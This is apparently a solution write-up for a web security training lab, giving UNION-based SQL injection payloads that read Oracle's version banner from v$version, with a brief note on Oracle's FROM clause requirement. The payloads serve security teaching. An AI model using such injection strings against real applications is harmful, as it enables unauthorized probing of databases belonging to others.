# Lab: SQL injection attack, querying the database type and version on Oracle (Practitioner)

**Goal:** Display the database version string.

## Solution

Oracle requires a `FROM` clause even for simple selects. Use `dual` or system views.

```
' UNION SELECT BANNER, NULL FROM v$version--
```

Or:

```
' UNION SELECT BANNER, NULL FROM v$version WHERE ROWNUM = 1--
```

## Payload

```
' UNION SELECT BANNER, NULL FROM v$version--
```
